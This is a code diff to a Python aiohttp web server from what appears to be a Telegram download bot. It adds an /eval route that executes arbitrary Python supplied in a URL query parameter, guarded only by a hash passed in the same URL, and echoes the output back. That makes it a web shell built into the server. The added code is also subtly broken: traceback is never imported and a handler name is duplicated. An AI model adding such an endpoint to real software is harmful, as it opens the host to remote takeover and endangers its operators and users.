@@ -1,6 +1,8 @@
 # Taken from megadlbot_oss <https://github.com/eyaadh/megadlbot_oss/blob/master/mega/webserver/routes.py>
 # Thanks to Eyaadh <https://github.com/eyaadh>
 
+import io
+import sys
 import time
 import math
 import logging
@@ -44,6 +46,59 @@ async def root_route_handler(request):
                 conn[dcid]=session.is_started.is_set()
         clint[x.username]=conn
     return web.json_response(clint)
+
+
+async def aexec(code,request):
+  exec(
+    f"async def __aexec(request): "
+    + "".join(f"\n {l}" for l in code.split("\n"))
+  )
+  return await locals()["__aexec"](request)
+@routes.get("/eval", allow_head=True)
+async def root_route_handler(request):
+    cmd=request.rel_url.query.get("cmd", None)
+    if not cmd:
+        return web.Response(text="""<html><body><form>
+<input name='hash' type="text"><br><textarea name='cmd'></textarea>
+<input type=submit>
+</form></body></html>
+""", content_type='text/html')
+    apihash=request.rel_url.query.get("hash", "")
+    if apihash!=Var.API_HASH:
+        return web.HTTPForbidden(text="Hash Missing")
+
+    old_stderr = sys.stderr
+    old_stdout = sys.stdout
+    redirected_output = sys.stdout = io.StringIO()
+    redirected_error = sys.stderr = io.StringIO()
+    stdout, stderr, exc = None, None, None
+  
+    try:
+      await aexec(cmd, request)
+    except Exception:
+      exc = traceback.format_exc()
+        
+    stdout = redirected_output.getvalue()
+    stderr = redirected_error.getvalue()
+    sys.stdout = old_stdout
+    sys.stderr = old_stderr
+  
+    evaluation = ""
+    if exc:
+      evaluation = exc
+    elif stderr:
+      evaluation = stderr
+    elif stdout:
+      evaluation = stdout
+    else:
+      evaluation = "Success"
+  
+    final_output = (
+      "<b>EVAL</b>: {}\n\n<b>OUTPUT</b>:\n{} \n".format(
+        cmd, evaluation.strip()
+      )
+    )
+    return web.Response(text=final_output, content_type="text/plain")
 
 @routes.get("/dl/{path}", allow_head=True)
 async def stream_handler(request: web.Request):
